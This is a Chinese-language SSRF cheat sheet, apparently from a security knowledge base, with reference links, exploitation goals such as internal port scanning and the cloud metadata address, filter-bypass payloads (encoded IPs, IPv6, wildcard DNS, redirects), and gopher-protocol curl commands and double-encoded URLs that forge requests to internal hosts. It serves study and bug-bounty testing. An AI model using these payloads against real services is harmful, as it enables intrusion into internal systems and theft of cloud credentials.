# SSRF

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**简介**

很多 web 应用都提供了从其他的服务器上获取数据的功能.使用用户指定的 URL,web 应用可以获取图片,下载文件,读取文件内容等.这个功能如果被恶意使用,可以利用存在缺陷的 web 应用作为代理攻击远程和本地的服务器.这种形式的攻击称为服务端请求伪造攻击(Server-side Request Forgery).

一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。

**相关文章**
- [浅析 SSRF 原理及利用方式](https://www.anquanke.com/post/id/145519)
- [聊一聊ssrf漏洞的挖掘思路与技巧](https://bbs.ichunqiu.com/thread-49370-1-1.html)
- [Bypassing SSRF Protection](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b)
- [Gopher协议在SSRF漏洞中的深入研究](https://zhuanlan.zhihu.com/p/112055947)
- [gopher 协议初探](https://www.cnblogs.com/Konmu/p/12984891.html)
- [How to hack a company by circumventing its WAF through the abuse of a different security appliance and win bug bounties](https://www.redtimmy.com/how-to-hack-a-company-by-circumventing-its-waf-through-the-abuse-of-a-different-security-appliance-and-win-bug-bounties/) - 利用 ssrf "借刀杀人"

**相关案例**
- [My First SSRF Using DNS Rebinding](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/)
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876) - 通过对 ssrf 访问 Google Cloud Metadata,直至 RCE
- [SSRF (Server Side Request Forgery) worth $4,913](https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb)
- [Just Gopher It: Escalating a Blind SSRF to RCE for $15k](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
- [SSRF exploitation in Spreedsheet to PDF converter](https://r4id3n.medium.com/ssrf-exploitation-in-spreedsheet-to-pdf-converter-2c7eacdac781) - excel 中的 ssrf+xxe 读文件

**payload**
- [bugbounty-cheatsheet/cheatsheets/ssrf.md](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md)

**相关工具**
- [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - python 写的 ssrf 参数扫描工具
- [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - 自动化 Fuzz SSRF 开发工具
- [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - 该工具生成 gopher payload ，以利用 SSRF 并在各种服务器中获得 RCE

**相关资源**
- [cujanovic/SSRF-Testing](https://github.com/cujanovic/SSRF-Testing)

**writeup**
- [buuctf 刷题记录 [第二章 web进阶]SSRF Training](https://www.cnblogs.com/murkuo/p/14905886.html)

---

## 利用方式

- 内部端口扫描
- Leverage cloud services
    - 169.254.169.254
        - https://www.ibm.com/developerworks/cn/cloud/library/1620-openstack-metadata-service/index.html
- reveal IP Address & HTTP Library
    - https://webhook.site/
- Download a very large file (Layer 7 DoS)

---

## 绕过技巧

**Fuzz字典**
- [Fuzz_head](https://github.com/ffffffff0x/AboutSecurity/blob/master/Dic/Web/http/Fuzz_head.txt)

**特殊 IP**
```
http://0177.1/
http://0x7f.1/
http://127.000.000.1
https://520968996
```

> The latter can be calculated using http://www.subnetmask.info/

**错误 IP**
```
http://127.1
http://0
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib : 3.3.3.3
http://127.1.1.1:80\@127.2.2.2:80/
```

**IPv6**

```
http://[::1]
http://[::]
http://[::]:80/
http://0000::1:80/
```

**Exotic Handlers**

```
gopher://, dict://, php://, jar://, tftp://
```

**DNS 欺骗**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

> http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

> http://nip.io

**重定向欺骗**
```
<?php header(“location: http://127.0.0.1"); ?>
```

**编码绕过**

这些包括十六进制编码，八进制编码，双字编码，URL 编码和混合编码。

```
127.0.0.1 translates to 0x7f.0x0.0x0.0x1
127.0.0.1 translates to 0177.0.0.01
http://127.0.0.1 translates to http://2130706433
localhost translates to %6c%6f%63%61%6c%68%6f%73%74
```

---

## Gopher

gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，在构成符合 gopher 协议的请求。

gopher 协议是 ssrf 利用中最强大的协议

**格式**
```
gopher://<host>:<port>/<gopher-path>_后接TCP数据流

curl gopher://127.0.0.1:8000/_GET%20test
```

gopher的默认端口是70

如果发起 post 请求，回车换行需要使用 %0d%0a，如果多个参数，参数之间的 & 也需要进行 URL 编码

**发送 get 请求**

如果要发送如下 payload
```
GET /test/get.php?name=test HTTP/1.1
Host: 192.168.1.1
```

那么需要变为如下格式
```
curl gopher://192.168.1.2:80/_GET%20/test/get.php%3fname=test%20HTTP/1.1%0d%0AHost:%20192.168.1.2%0d%0A
```

在 HTTP 包的最后要加 %0d%0a，代表消息结束

**发送 post 请求**

```
POST /test/post.php HTTP/1.1
Host: 192.168.1.1
Content-Type:application/x-www-form-urlencoded
Content-Length:11

name=test
```

那么需要变为如下格式
```
curl gopher://192.168.1.1:80/_POST%20/test/post.php%20HTTP/1.1%0d%0AHost:192.168.1.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=test%0d%0A
```

**ssrf 中的利用**

```
http://192.168.1.1/test/ssrf.php?url=gopher://192.168.1.2:6666/_abc

# 由于PHP在接收到参数后会做一次URL的解码,所以要在 url 编码一次
http://192.168.1.1/test/ssrf.php?url=gopher%3A%2F%2F192.168.1.2%3A80%2F_GET%2520%2Ftest%2Fget.php%253fname%3Dtest%2520HTTP%2F1.1%250d%250AHost%3A%2520192.168.1.2%250d%250A
```

URL中的／不能进行两次编码，端口号不可以两次编码,协议名称不可两次转码
